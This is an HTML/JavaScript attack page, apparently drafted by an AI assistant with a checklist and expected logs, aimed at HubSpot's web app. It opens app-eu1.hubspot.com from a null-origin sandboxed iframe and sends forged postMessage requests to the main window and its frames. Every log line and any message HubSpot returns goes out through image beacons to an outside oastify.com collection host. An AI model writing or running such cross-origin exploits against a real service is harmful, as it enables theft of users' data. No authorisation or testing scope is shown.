<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        const blob = new Blob([`
<html>
<body>
<h2>Null Origin Sandbox</h2>
<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function l(m) { 
    const d = document.getElementById('log');
    d.innerHTML += '<br>' + m;
    d.scrollTop = d.scrollHeight;
    new Image().src = E + '/?s=' + encodeURIComponent(m); 
}

l('START');
l('origin=' + window.origin);

// Listen for ALL messages (including from HubSpot)
window.addEventListener('message', function(r) {
    l('!!!MESSAGE_RECEIVED!!!');
    l('from=' + r.origin);
    l('type=' + (r.data.type || typeof r.data));
    new Image().src = E + '/?MSG=' + encodeURIComponent(JSON.stringify(r.data).substring(0, 500));
});

l('opening_hub');

let h = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');

if (!h) {
    l('blocked');
} else {
    l('opened');
    
    let attempts = 0;
    let checker = setInterval(() => {
        attempts++;
        
        try {
            h.origin;
            if (attempts % 20 === 0) l('wait_' + attempts);
        } catch(e) {
            clearInterval(checker);
            l('loaded_' + attempts);
            
            // Wait for HubSpot to initialize
            setTimeout(() => {
                l('SENDING_TO_TOP_WINDOW');
                
                // Send to main window
                h.postMessage({
                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                    commandId: 'test123',
                    featureId: 'email_editor',
                    parameters: {},
                    resultCount: 1,
                    language: 'en',
                    objectId: '46962361',
                    applicationId: 'email',
                    basePath: '/',
                    maxPollingAttempts: 5,
                    pollingInterval: 1000
                }, '*');
                
                l('sent_to_top');
                
                // Try sending to frames (HubSpot has multiple iframes)
                setTimeout(() => {
                    l('SENDING_TO_FRAMES');
                    
                    try {
                        // Try to send to frames[0], frames[1], etc.
                        for(let i = 0; i < 10; i++) {
                            try {
                                if (h.frames[i]) {
                                    h.frames[i].postMessage({
                                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                                        commandId: 'test' + i,
                                        featureId: 'test',
                                        parameters: {},
                                        resultCount: 1,
                                        language: 'en',
                                        objectId: '46962361',
                                        applicationId: 'test',
                                        basePath: '/',
                                        maxPollingAttempts: 1,
                                        pollingInterval: 100
                                    }, '*');
                                    l('sent_to_frame_' + i);
                                }
                            } catch(err) {
                                l('frame_' + i + '_error');
                            }
                        }
                    } catch(e) {
                        l('frames_error=' + e.message);
                    }
                    
                    l('DONE_SENDING');
                    
                }, 1000);
                
            }, 3000);
        }
        
        if (attempts > 150) {
            clearInterval(checker);
            l('timeout');
        }
    }, 100);
}
<\/script>
</body>
</html>
        `], {type: 'text/html'});
        
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        iframe.src = blobUrl;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('iframe_added');
    }
});

if(window.opener) {
    window.opener.postMessage({status:'ready'},'*');
}
</script>
</body>
</html>
```

---

### **What This Does:**

1. ✅ Creates null origin sandbox (working)
2. ✅ Opens HubSpot popup
3. ✅ Sends message to **top window**
4. ✅ **Also tries sending to all iframes** (frames[0] through frames[9])
5. ✅ **Listens for ANY message** from HubSpot (to see if we get responses)

---

### **Expected Logs:**
```
/?s=START
/?s=origin=null
/?s=opening_hub
/?s=opened
/?s=loaded_XX
/?s=SENDING_TO_TOP_WINDOW
/?s=sent_to_top
/?s=SENDING_TO_FRAMES
/?s=sent_to_frame_0
/?s=sent_to_frame_1
/?s=sent_to_frame_2
...
/?s=DONE_SENDING
/?MSG=...                ← ANY response from HubSpot
/?s=!!!MESSAGE_RECEIVED!!!
